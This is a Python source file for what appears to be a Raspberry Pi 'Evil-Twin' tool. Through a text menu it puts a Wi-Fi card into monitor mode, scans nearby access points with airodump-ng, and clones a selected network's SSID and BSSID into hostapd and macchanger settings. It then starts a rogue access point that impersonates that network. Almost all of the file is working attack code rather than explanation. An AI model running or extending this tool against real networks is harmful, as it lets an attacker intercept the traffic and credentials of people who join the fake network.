import subprocess
import time
import os
import re

def main():
    os.system("clear")
    evil_twin_state = 0
    SSID = "Not an Evil Twin" # read in from file
    MAC_ADDR = "aa:bb:cc:dd:ee:ff" # read in from file

    wifi_card_name = get_wifi_adaptor()
    print("RPi Evil-Twin framework. (Add cool ascii art.)")
    while True:
        print(f"Current SSID: {SSID}\nCurrent BSSID: {MAC_ADDR}\n")
        if evil_twin_state==0:
            print("[1] Start Evil-Twin")
        else:
            print("[1] Stop Evil-Twin")
        print("[2] Clone Access Point")
        print("[3] Scan for Access Points")
        print("[4] Set SSID and BSSID manually")
        print("[5] Help Menu")
        
        menu = input("> ")
        os.system('clear')
        if menu.lower() == 'quit' or menu.lower() == 'q':
            break
        elif menu == '1':
            if evil_twin_state==0:
                print("Starting Evil-Twin ...")
                p = subprocess.Popen(["sudo", "./PiEvilTwinStart.sh"], stdin = subprocess.PIPE, stdout = subprocess.PIPE)
                p.communicate()
                print("Evil-Twin is running.")
                evil_twin_state=1
            else:
                print("Stopping Evil-Twin ...")
                p = subprocess.Popen(["sudo", "./stop.sh"], stdin = subprocess.PIPE, stdout = subprocess.PIPE)
                p.communicate()
                print("Stopped.")
                evil_twin_state=0
            input("\nPress Enter to continue.\n>")
        elif menu == '2':
            print("Scanning ...")
            aps = scan(wifi_card_name)
            print("\nSelect Access Point to clone:")
            key = {}

            for j,i in enumerate(aps):
                print(f"{j} : {i} [{aps[i][0]}]")
                key[str(j)]= [i,aps[i][0]]

            print(f"{j+1} : To return to menu.")
            choice = input("\n> ")

            try:

                if int(choice) in range(0,j):
                    SSID, MAC_ADDR =  key[choice]
                    change_ssid(SSID)
                    change_mac_addr(MAC_ADDR)

            except TypeError as e:
                pass

        elif menu == '3':
            print("Scanning ...")
            aps = scan(wifi_card_name)
            print("Scanned APs:")

            for i in aps:
                print(f"{i} [{aps[i][0]}]")

            input("\nPress Enter to continue.\n>")

        elif menu == '4':
            os.system("clear")
            temp_SSID = input("Enter new SSID: ")
            temp_MACADDR = input("Enter new BSSID: ")

            if not no_rce_pls(temp_MACADDR):
                print("Invalid BSSID.")
                print("Use format aa:bb:cc:00:11:22")
                input("\nPress Enter to continue.\n>")

            else:
                SSID = temp_SSID
                MAC_ADDR = temp_MACADDR
                change_ssid(SSID)
                change_mac_addr(MAC_ADDR)

        elif menu=='5':
            print("Read source code.") # Have to add later.
            input("\nPress Enter to continue.\n>")
        else:
            pass
        os.system('clear')
    
def scan(wifi_card_name):
    mon_name = start_monitor_mode(wifi_card_name)
    scan_aps(mon_name, 5, "out")
    stop_monitor_mode(mon_name)
    aps = get_aps("out")
    os.system('clear')
    return aps

def no_rce_pls(mac_string):
    MAC_PATTERN = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    if re.match(MAC_PATTERN,mac_string):
        return True
    else:
        return False

def change_mac_addr(name: str):
    update_file("./PiEvilTwinStart.sh", f"macchanger --mac={name} wlan0\n")


def update_file(file_name: str, string: str):
    file = ''
    with open(file_name, 'r') as f:
        for line in f:

            if line.startswith(string[:4]):
                file += string

            else:
                file += line

    with open(file_name, 'w') as f:
        f.write(file)

def get_wifi_adaptor() -> str:
    p = subprocess.Popen(["sudo", "airmon-ng"], stdin = subprocess.PIPE, stdout = subprocess.PIPE)
    name = p.stdout.readlines()[3].decode().split()[1]
    return name


def start_monitor_mode(name) -> str:
    p = subprocess.Popen(["sudo", "airmon-ng", "start", name], stdin = subprocess.PIPE, stdout = subprocess.PIPE)
    new_name = p.stdout.readlines()[-3].decode().split("]")[1].strip()
    time.sleep(.1)
    p.terminate()
    return new_name


def stop_monitor_mode(name):
    p = subprocess.Popen(["sudo", "airmon-ng", "stop", name], stdin = subprocess.PIPE, stdout = subprocess.PIPE)
    time.sleep(.1)
    p.terminate()


def scan_aps(name, times, file_name):
    p = subprocess.Popen(["sudo", "timeout", f"{times}s", "airodump-ng", name, "-w", "/tmp/" + file_name, "-o","csv"],
                         stdin = subprocess.PIPE, stdout = subprocess.PIPE)
    time.sleep(6)
    p.terminate()


def get_aps(file_name) -> dict:
    aps = {}
    with open(f"/tmp/{file_name}-01.csv") as file:
        for line in file:

            if "Probed" in line:
                break

            elif "BSSID" in line or line == "\n":
                pass

            else:
                bssid = line.split(',')[0]
                ssid = line.split(',')[-2].strip()
                enc = line.split(',')[5:8]

                if ssid != '':
                    aps[ssid] = [bssid,enc]

    p = subprocess.Popen(["sudo", "rm", f"/tmp/{file_name}-01.csv"])
    return aps


def add_wpa2(password: str):
    update_file('./config/hostapd-WPA2.conf', f"wpa_passphrase={password}\n")


def change_ssid(name: str):
    update_file('./config/hostapd-OPN.conf', f'ssid={name}\n')

if __name__ == "__main__":
    main()